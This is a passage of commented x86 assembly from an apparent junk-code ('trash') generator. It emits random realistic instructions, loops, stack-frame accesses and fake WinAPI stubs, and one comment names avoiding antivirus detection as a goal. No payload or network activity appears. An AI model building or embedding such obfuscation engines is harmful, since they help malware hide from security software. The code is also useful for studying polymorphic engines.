	test	[ebx].xmask1, XTG_FUNC										;если сейчас стоит режим XTG_REALISTIC, и выставлен флаг XTG_FUNC - тогда функи (с прологами etc) будет генерить xTG, а значит 
	je		_xwf_nxt1_ 													;поставим адрес своей структуры XTG_FUNC_STRUCT; иначе генерация фунок происходит каким-то другим движков/модулем; или вообще никем; 
	mov		eax, [ebx].xfunc_struct_addr
	mov		[edx].xfunc_struct_addr, eax

_xwf_nxt1_: 
	push	[edx].tw_api_addr 
	push	[edx].api_size
	push	[edx].api_hash

	mov		[edx].tw_api_addr, edi
	mov		[edx].api_size, WINAPI_MAX_SIZE
	push	[ebx].faka_struct_addr
	call	[ebx].faka_addr

	add		edi, [edx].nobw 
	sub		ecx, [edx].nobw
	pop		[edx].api_hash
	pop		[edx].api_size
	pop		[edx].tw_api_addr
	mov		[edx].xfunc_struct_addr, esi
	jmp		_chk_instr_
;=====================================[FAKE WINAPI FUNC]=================================================
 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи xtg_main 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx




	
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функция get_minsize_instr
;получение размера "самой короткой", разрешенной для генерации, инструкции/конструкции
;ВХОД:
;	EBX					-	адрес структуры XTG_TRASH_GEN
;	и другие параметры (в xm_struct2_addr - адрес структуры XTG_EXT_TRASH_GEN etc);
;ВЫХОД:
;	xm_minsize_instr	-	размер "самой короткой" доступной инструкции/конструкции;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
get_minsize_instr:
	pushad
	mov		ecx, xm_struct2_addr
	assume	ecx: ptr XTG_EXT_TRASH_GEN 
	mov		ecx, [ecx].ofs_addr
	xor		edx, edx
	mov		xm_minsize_instr, MAX_SIZE_INSTR							;сначала инициализируем переменную самым большим размером доступной инструкции/конструкции
_nxtsi1_:
	cmp		[ebx].fmode, XTG_REALISTIC									;если режим генерации мусора - "по маске", 
	je		_cmsi1_
	mov		eax, edx													;тогда сперва проверим, доступна ли для генерации очередная инструкция
	
	call	check_mask
	
	jnc		_nxtsi2_
_cmsi1_:																;если же инструкция доступна (а в случае режима "реалистичность" доступна (почти) любая команда), то 
	mov		eax, dword ptr [ecx + edx * 4]								;берем очередной dword
	shr		eax, 16														;оттуда берем размер
	cmp		xm_minsize_instr, eax										;и сравниваем, если значение в переменной больше текущего значения в EAX, тогда сохраним значение, которое в EAX
	jle		_nxtsi2_
	mov		xm_minsize_instr, eax
_nxtsi2_:
	inc		edx															;переходим к сравнению следующих значений;
	cmp		edx, NUM_INSTR 
	jne		_nxtsi1_
	popad
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи get_minsize_instr
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
	 


;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа check_instr
;проверка, можно ли генерировать определенную инструкцию
;ВХОД:
;	EAX		-	число - порядковый номер инструкции в таблице (в таблице статистики частот опкодов и размеров команд)
;	EBX		-	адрес структуры XTG_TRASH_GEN
;	и др. (смотри выше);
;ВЫХОД:
;	EAX		-	если команду можно генерировать, тогда EAX сохранит своё начальное входное значение, иначе -1;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
check_instr:
	pushad
	mov		edx, xm_struct2_addr
	assume	edx: ptr XTG_EXT_TRASH_GEN 
	mov		edx, [edx].ofs_addr											;EDX - адрес таблички статистики частот опкодов и размеров команд
	mov		edx, dword ptr [edx + eax * 4]								;берем частоту появления и размер нужного нам опкода; 	
	movzx	edx, dx 													;EDX - частота появления нужного нам опкода (опкодов);
	cmp		[ebx].fmode, XTG_REALISTIC									;проверяем, какой режим генерации трэша сейчас стоит
	jne		_fmode_mask_

_fmode_realistic_: 														;если сейчас режим "реалистичность", 
	push	MAX_STAT													;тогда сгенерируем случайное число в диапазоне [0..MAX_STAT - 1]; MAX_STAT - максимальная частота появления опкода - короче говоря - это equ 100%;
	call	[ebx].rang_addr
	
	cmp		edx, eax													;если частота нужного нам опкода больше выпавшего случайного числа (чтобы конструкции с 0-ой частотой тоже проходили, заменяем на jge), тогда инструкцию можно генерировать; 
	jg		_ci_final_ 													;это и есть статистические методы - выбор стат. вероятностей;
	jmp		_not_ci_

_fmode_mask_:															;если сейчас режим "маска", тогда проверим маску - указано ли в ней, что можно генерировать данный опкод (команду)?
	call	check_mask
	
	jc		_ci_final_  												;если да, то выходим
_not_ci_:	
	or		dword ptr [esp + 1Ch], -01									;иначе на выходе из данной функи EAX = -1;  	 
_ci_final_:
	popad
	ret 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи check_instr
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа check_mask
;проверка команды по маске - можно ли генерить выбранную команду или нет
;ВХОД:
;	EAX		-	число - позиция в маске бита, который нужно проверить; 
;	EBX		-	структура XTG_TRASH_GEN
;ВЫХОД:
;	если команду можно генерить, тогда будет взведён флаг CF = 1, иначе CF = 0; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
check_mask:
_xmask1_:
	cmp		eax, 31
	jg		_xmask2_
	bt		[ebx].xmask1, eax 
	ret
_xmask2_:
	sub		eax, (31 + 01) 
	bt		[ebx].xmask2, eax
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи check_mask 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa check_data 
;проверка адреса и размера данных на валидность; 
;ВХОД:
;	EBX		-	XTG_TRASH_GEN 
;	etc
;ВЫХОД:
;	EAX		-	1, если можно юзать (для генерации команд) переданную область данных, иначе 0; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
check_data:
	xor		eax, eax 
	push	esi
	mov		esi, [ebx].xdata_struct_addr
	assume	esi: ptr XTG_DATA_STRUCT
	test	esi, esi													;если данное поле = 0, значит область памяти не была передана;
	je		_cd_ret_
	cmp		[esi].xdata_addr, 00h										;если адрес начала области данных (секции данных) равен нулю, 
	je		_cd_ret_													;то на выход;
	cmp		[esi].xdata_size, 04h										;иначе если размер области (секции) данных меньше 4-х, тогда на выход; 
	jb		_cd_ret_ 
	inc		eax															;иначе всё отлично=)! 
_cd_ret_:
	pop		esi 
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи check_data
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa get_rnd_data_va   
;получение случайного адреса (VA) в секции данных. Случайный адрес кратен четырём; 
;ВХОД:
;	ebx		-	etc
;	etc
;ВЫХОД:
;	eax		-	случайный адрес, кратный 4 (при условии, что xdata_addr (VirtualAddress) - был кратен 4); 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
get_rnd_data_va:
	push	edx															;сохраняем edx в стеке
	push	esi
	mov		esi, [ebx].xdata_struct_addr
	assume	esi: ptr XTG_DATA_STRUCT
	mov		eax, [esi].xdata_size 										;eax = размер секции данных (области данных); 
	sub		eax, 04														;отнимаем 4, чтобы случайно не залезть на чужие адреса; 

	push	eax 
	call	[ebx].rang_addr												;получаем СЧ [0..xdata_size - 4 - 1]

	mov		edx, eax
	and		edx, 03
	sub		eax, edx													;делаем полученное значение кратным четырём; 
	add		eax, [esi].xdata_addr										;добавляем адрес;
	pop		esi
	pop		edx															;восстанавливаем edx; 
	ret 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи get_rnd_data_va 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa get_rnd_num_1 
;получение СЧ по некоторой маске;
;ВХОД:
;	EAX		-	число N;
;ВЫХОД:
;	EAX		-	СЧ в диапазоне [0..N-1]; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
get_rnd_num_1:
	push	edx 

	push	eax
	call	[ebx].rang_addr

	xchg	eax, edx

	push	edx
	call	[ebx].rang_addr

	and		eax, edx
	pop		edx
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи get_rnd_num_1
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

		

;====================================[FUNCTIONS FOR CYCLES]==============================================

;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функция init_cnt_for_cycle
;инициализация счётчика (регистра)
;пока доступны вот такие варианты:
;1) push imm8	pop reg32
;2) mov reg32, imm32
;ВХОД:
;	ECX			-	кол-во оставшихся для записи трэша байтеков (для большинства функций это тоже относится etc); 
;	EBX			-	адрес структуры XTG_TRASH_GEN
;	xm_tmp_reg1	-	число - номер регистра (XM_EAX etc) - счётчик в цикле; 
;ВЫХОД:
;	генерация одной из доступных инструкций;
;	корректировка некоторых значений (ECX etc);
;	EAX			-	число - начальное значение счётчика (EAX = imm8 или imm32 в зависимости, что сгенерилось); 	  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
init_cnt_for_cycle:
	push	02
	call	[ebx].rang_addr

	test	eax, eax													;"случайным" образом определяем, какую команду будем генерировать; 
	je		_push___imm8____pop___r32_

_mov___r32__imm32_:														;MOV REG32, IMM32		
	mov		eax, xm_tmp_reg1
	add		al, 0B8h
	stosb																;opcode - 1 byte;

	push	1000h
	call	[ebx].rang_addr 

	add		eax, 81h													;IMM32 = [0x81..0x1000 - 0x01 + 0x81];
	stosd
	sub		ecx, 05														;корректируем;
	ret

_push___imm8____pop___r32_:												;PUSH IMM8	POP REG32
	mov		al, 6Ah
	stosb

	push	7Eh
	call	[ebx].rang_addr

	inc		eax															;IMM8 = [0x02..0x7F]
	inc		eax
	stosb
	push	eax
	mov		eax, xm_tmp_reg1 
	add		al, 58h
	stosb
	pop		eax
	sub		ecx, 03
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи init_cnt_for_cycle 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa chg_cnt_for_cycle
;изменение счётчика (регистра) в цикле (увеличение/уменьшение) 
;пока доступны вот такие варики:
;1) add/sub reg32, imm8
;2) inc/dec reg32
;ВХОД:
;	EBX			-	см выше =)!
;	xm_tmp_reg1	-	число - номер регистра (XM_EAX etc); 
;ВЫХОД:
;	EAX			-	адрес в буфере, где записана команда изменения счетчика в цикле;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
chg_cnt_for_cycle:
	push	edx															;сохраняем в стэке значение EDX; 

	push	02
	call	[ebx].rang_addr												;получим 0 или 1

	xchg	eax, edx													;сохраним это в edx

	push	02
	call	[ebx].rang_addr

	test	eax, eax													;далее случайно выберем, какую команду будем генерировать
	je		_inc_dec___r32_  
_add_sub___r32__imm8_:													;ADD/SUB REG32, IMM8
	mov		al, 83h
	push	edi
	stosb
	mov		eax, 0C0h;не al, а eax!;									;ADD -> modrm = [0xC0..0xC7]; SUB -> MODRM = [0xE8..0xEF]  
	imul	edx, edx, 05
	shl		edx, 03
	add		eax, edx
	add		eax, xm_tmp_reg1
	stosb

	push	05;(256 - 3) 
	call	[ebx].rang_addr

	add		eax, 03														;IMM8 = [0x03..0x05 - 0x01 + 0x03]; 
	stosb
	pop		eax
	sub		ecx, 03
	pop		edx
	ret

_inc_dec___r32_:														;INC/DEC REG32
	mov		eax, 40h
	shl		edx, 03
	add		eax, edx
	add		eax, xm_tmp_reg1
	push	edi
	stosb
	pop		eax
	dec		ecx
	pop		edx
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи chg_cnt_for_cycle  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa cmp_for_cycle  
;сравнение счётчика в цикле с другим регистром или числом;
;пока доступны вот такие штуки:
;1) cmp reg32_1, reg32_2
;2) cmp reg32, imm8 
;3) cmp reg32, imm32
;ВХОД:
;	EBX, ECX		-	etc;
;	EAX				-	число - начальное значение счётчика (IMM8 или IMM32), полученное после вызова функи init_cnt_for_cycle; 
;	EDX				-	0 или 1; 0 - счётчик увеличивается или 1 - счётчик уменьшается; (узнаем после вызова chg_cnt_for_cycle); 
;	xm_tmp_reg1		-	число - номер регистра (XM_EAX etc) - это и есть счётчик (в цикле);
;	xm_tmp_reg2		-	число - номер 2-ого регистра - если равно -1, тогда эта переменная не юзается; 
;ВЫХОД:
;	(+); 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
cmp_for_cycle:
	cmp		xm_tmp_reg2, -01											;если здесь -1, тогда перепрыгнем; 
	je		_c4c_nxt_1_ 												;такое происходит тогда, когда мы не сгенерировали инициализацию счётчика (не вызвали функу init_cnt_for_cycle); 
								
_cmp___r32__r32_:														;в такой ситуации сгенерим команду CMP REG32_1, REG32_2 (REG32_1 != REG32_2); 
	mov		al, 3Bh
	stosb
	mov		eax, xm_tmp_reg1
	shl		eax, 03
	add		al, 0C0h
	add		eax, xm_tmp_reg2
	stosb
	dec		ecx
	dec		ecx
	ret

_c4c_nxt_1_:															;иначе
	push	edx 
	push	esi
	xchg	eax, esi
	test	edx, edx													;сначала определим, увеличивается или уменьшается наш счётчик?
	jne		_c4c_sub_cnt_

_c4c_add_cnt_:															;если счётчик увеличивается, 
	push	1000h														;тогда сравниваемое значение (imm8 или imm32) должно быть больше значения счётчика; 
	call	[ebx].rang_addr												;то есть, например, если счётчик у нас - это регистр ECX, и он равен 5, тогда IMM (8 или 32) должно быть > 5; -> cmp ecx, 7 etc; 
	
	xchg	eax, edx
	
	push	edx
	call	[ebx].rang_addr

	and		eax, edx

	lea		eax, dword ptr [eax + esi + 01]								;
	jmp		_c4c_nxt_2_  
_c4c_sub_cnt_:															;если же счётчик уменьшается, тогда сравниваемое значение должно быть меньше значения счётчика, например, 
	dec		esi 														;если счётчик - это ecx и он = 5, тогда imm (8 или 32) < 5, но > 0; 

	push	esi
	call	[ebx].rang_addr

	inc		eax
_c4c_nxt_2_:
	xchg	eax, esi
	cmp		esi, 80h													;у нас теперь есть это сравниваемое число, теперь определим, это imm8 или imm32? 
	jl		_cmp___r32__imm8_											;если данное значение < 80h, значит это imm8, иначе это imm32; 
_c4c_cmp___r32__imm32_:													;если же это imm32, тогда определим, счётчик - это регистр и какой? 
	cmp		xm_tmp_reg1, XM_EAX											;если же счётчик - это регистр EAX, тогда сгенерим "сокращённый" вариант команды сравнения; 
	je		_cmp___eax__imm32_
_cmp___r32__imm32_:														;иначе, сгенерируем CMP REG32, IMM32; (REG32 != EAX);
	mov		al, 81h
	stosb
	mov		eax, xm_tmp_reg1
	add		al, 0F8h 
	stosb
	xchg	eax, esi
	stosd
	jmp		_cmp___r32__imm32_ret_
_cmp___eax__imm32_:														;CMP EAX, IMM32; 
	mov		al, 3Dh
	stosb
	xchg	eax, esi
	stosd
	inc		ecx
_cmp___r32__imm32_ret_:
	sub		ecx, 6
	pop		esi
	pop		edx
	ret	 

_cmp___r32__imm8_:														;CMP REG32, IMM8; 
	mov		al, 83h
	stosb
	mov		eax, xm_tmp_reg1
	add		al, 0F8h
	stosb
	xchg	eax, esi
	stosb
	sub		ecx, 03
	pop		esi
	pop		edx
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи cmp_for_cycle  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx


	
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа get_num_free_r32   
;получение кол-ва свободных 32-х разрядных регистров; 
;ВХОД:
;	ECX, EBX	-	etc;
;ВЫХОД:
;	EAX			-	количество свободных 32-х разрядных регистров; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
get_num_free_r32:
	push	edx
	push	esi
	xor		edx, edx
	xor		esi, esi
_gnfr32_cycle_:	
	mov		eax, edx

	call	check_r														;вызываем функу, определяющую, свободен или занят рег? 

	inc		eax															;если после вызова данной функции EAX == -1, тогда регистр занят, иначе рег свободен; 
	je		_gnfr32_nxt_1_
	inc		esi
_gnfr32_nxt_1_:
	inc		edx
	cmp		edx, 8
	jne		_gnfr32_cycle_ 
	xchg	eax, esi
	pop		esi
	pop		edx 
	ret 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи get_num_free_r32  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

;====================================[FUNCTIONS FOR CYCLES]==============================================



;============================[FUNCTIONS FOR INSTR WITH EBP & moffs8]=====================================
;!!!!! если захотелось генерить команды ещё и с moffs32, тогда добавить здесь (в этих функциях) нужный код; 
;!!!!! команды с moffs32 имеют немного другой байт и разную длину команд, так то блин;  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa check_local_param_num
;Проверка на корректность кол-ва локальных переменных и входных параметров
;а также случайный выбор, какой из 2-х вариантов будем чекать тщательней для последующей его генерации; 
;ВХОД:
;	ebx						-	etc
;	[ebx].xfunc_struct_addr	-	адрес структуры XTG_FUNC_STRUCT, чьи поля будем проверять; 
;ВЫХОД:
;	eax						-	-1, если проверка не пройдена успешно, иначе 0 (если выбраны локальные 
;								переменные) либо 4 (если входные параметры);
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
check_local_param_num: 	
	push	edx															;сохраняем в стеке реги; 
	push	esi 

	push	02
	call	[ebx].rang_addr												;случайно выбираем, какой из вариантов будем тщательней проверять и в дальнейшем генерить: локальную переменную [ebp - XXh] или входной параметр [ebp + XXh];   

	shl		eax, 02														;eax = 0 или 4; 
	lea		edx, dword ptr [eax + 01]									;edx > 0; 
	mov		esi, [ebx].xfunc_struct_addr
	assume	esi: ptr XTG_FUNC_STRUCT									;esi - address of struct XTG_FUNC_STRUCT; 
	test	esi, esi													;если здесь 0, тогда структуры нет, а значит мы не генерим функу, и поэтому генерацию команд с участием ebp - не вариант делать, ибо возможны глюки и палево для ав; 
	je		_clp_fuck_
	cmp		[esi].local_num, (84h / 04)									;иначе проверим, если кол-во локальных переменных больше данного значения, тогда выйдем - так как для такой ситуации должны генериться другие опкоды. Как вариант можно просто добавить возможность генерации этих опкодов и всё; 
	jge		_clp_fuck_
	cmp		[esi].param_num, (80h / 04)									;etc
	jge		_clp_fuck_
	test	eax, eax
	je		_clp_local_
_clp_param_:															;если выбрана проверка и последующая генерация входных параметрров, тогда проверим, вообще есть ли входные параметры в данной структуре? 
	imul	edx, [esi].param_num
	jmp		_clp_nxt_1_
_clp_local_:
	imul	edx, [esi].local_num										;это для локальных переменных; 
_clp_nxt_1_:
	test	edx, edx 													;теперь проверим edx - если он = 0 (то есть, например, если выбрали локал. перем., и их кол-во = 0 - то есть их нет); 
	jne		_clp_ret_													
_clp_fuck_:																;тогда eax = -1 и на выход
	xor		eax, eax
	dec		eax
_clp_ret_:
	pop		esi															;иначе eax != -1; (= 0 или 4); 
	pop		edx 
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи check_local_param_num 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;funka get_moffs8_ebp_local
;получение (генерация) случайного 8-мибитного смещения в памяти для регистра ebp (локальная переменная);
;например, команда [ebp - 14h] - -14h (байт 0xEC) это и есть 8-мибитное смещение в памяти для регистра ebp; 
;ВХОД:
;	ebx		-	etc
;ВЫХОД:
;	eax		-	случайное 8-мибитное смещение (берется случайный номер локальной переменной и строится смещение); 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
get_moffs8_ebp_local:													;moffs8 - mem32 offset8 ebp; 
	push	esi
	mov		esi, [ebx].xfunc_struct_addr
	assume	esi: ptr XTG_FUNC_STRUCT

	push	[esi].local_num												;выбираем случайный номер локальной переменной
	call	[ebx].rang_addr

	inc		eax															;как минимум у нас будет номер 1 - первая локальная переменная - [ebp - 04] 
	imul	eax, eax, 04												;умножаем на 4, так как размер локальной переменной = 4 байта; 
	neg		eax															;и инвертируем - так как это локал. переменная (знак "минус"); 
	pop		esi
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи get_moffs8_ebp_local
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;funka get_moffs8_ebp_param
;получение (генерация) случайного 8-мибитного смещения в памяти для регистра ebp (входной параметр);
;например, команда [ebp + 14h] - 14h (байт 0x14) это и есть 8-мибитное смещение в памяти для регистра ebp; 
;ВХОД:
;	ebx		-	etc 
;ВЫХОД:
;	eax		-	случайное 8-мибитное смещение (берется случайный номер входного параметра и строится смещение);  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
get_moffs8_ebp_param:													;moffs8 - mem32 offset8 ebp; 
	push	esi
	mov		esi, [ebx].xfunc_struct_addr
	assume	esi: ptr XTG_FUNC_STRUCT

	push	[esi].param_num												;выбираем случайный номер входного параметра (выбираем случайный входной параметр); 
	call	[ebx].rang_addr

	inc		eax															;как минимум это 1;
	imul	eax, eax, 04												;умножаем на 4; etc
	add		eax, 04														;и добавляем 4 - так как у нас будет так, например: 
																		;push ecx							;входной параметр, это сейчас [esp + 00h]
																		;call	func_1						;вызов функи func_1, теперь чтобы обратиться к входному параметру, нужно сделать [esp + 04h]
																		;...
																		;func_1:
																		;push	ebp							;[esp + 08h]
																		;mov	ebp, esp					;[ebp + 08h] 
																		;mov	dword ptr [ebp + 08], 05 
	pop		esi
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи get_moffs8_ebp_param
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



